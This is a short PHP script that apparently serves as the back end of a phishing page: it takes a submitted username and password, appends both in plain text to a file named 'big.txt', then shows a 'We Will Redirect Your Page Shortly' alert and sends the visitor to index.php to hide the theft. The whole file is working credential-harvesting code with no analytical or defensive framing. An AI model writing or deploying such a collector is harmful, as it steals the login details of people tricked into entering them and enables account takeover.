<?php
if(isset($_POST['send'])){
$username=$_POST['user'];
$password=$_POST['pass'];

   $file=fopen("big.txt","a");
    fwrite($file,"name:");
    fwrite($file, $username ."\n");
    fwrite($file,"Password:");
    fwrite($file, $password ."\n");
    fclose($file);
    echo" <script>alert('We Will Redirect Your Page Shortly');window.location='index.php';</script>";

}

?>